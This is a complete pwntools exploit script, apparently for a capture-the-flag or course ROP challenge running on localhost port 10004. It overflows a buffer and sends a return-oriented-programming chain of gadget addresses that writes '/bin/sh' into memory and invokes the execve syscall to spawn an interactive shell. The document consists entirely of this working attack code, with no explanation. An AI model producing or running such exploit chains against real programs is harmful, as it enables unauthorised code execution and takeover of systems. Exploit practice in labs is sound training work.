from pwn import *

context.arch = 'amd64'

# r = process('../rop/share/rop')
r = remote('127.0.0.1', 10004)
rop = flat(
    0x408b10, # pop rsi ; ret
    0x49d0c0, # writable address
    0x41d037, # pop rax ; ret
    b'/bin/sh\x00',
    0x41e971, # mov qword ptr [rsi], rax ; ret
    0x41d037, # pop rax ; ret
    0x3b, # execve
    0x401f78, # pop rdi ; ret
    0x49d0c0, # writable address
    0x408b10, # pop rsi ; ret
    0x0, # NULL
    0x45f217, # pop rdx ; pop rbx ; ret
    0x0, # NULL
    0x0, # NULL
    0x40123d, # syscall
)
payload = b'A' * (0x20 + 8) + rop

r.sendlineafter(b'Give me your message: ', payload)
r.interactive()
